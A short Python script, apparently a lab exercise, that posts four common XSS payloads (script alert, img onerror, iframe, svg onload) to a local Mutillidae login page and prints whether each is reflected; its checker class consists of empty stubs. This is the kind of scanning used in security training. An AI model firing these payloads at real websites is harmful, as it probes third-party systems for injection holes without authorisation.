import requests

url = "http://localhost/HACKLAB/mutillidae/index.php?page=login.php"


class XssChecker:

    def get_html(url):
        return url

    def ScanningForxss(targetWebsite):
        pass


xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='https://example.com/xss' onerror='alert(\"XSS\")'>",
    "<iframe src='https://example.com/xss'></iframe>",
    "<svg/onload=alert('XSS')>",
]


for payload in xss_payloads:
    response = requests.post(url+payload)

    if payload in response.text:
        print(f"XSS vulnerability found with payload: {payload}")
    else:
        print("no vulnerable")
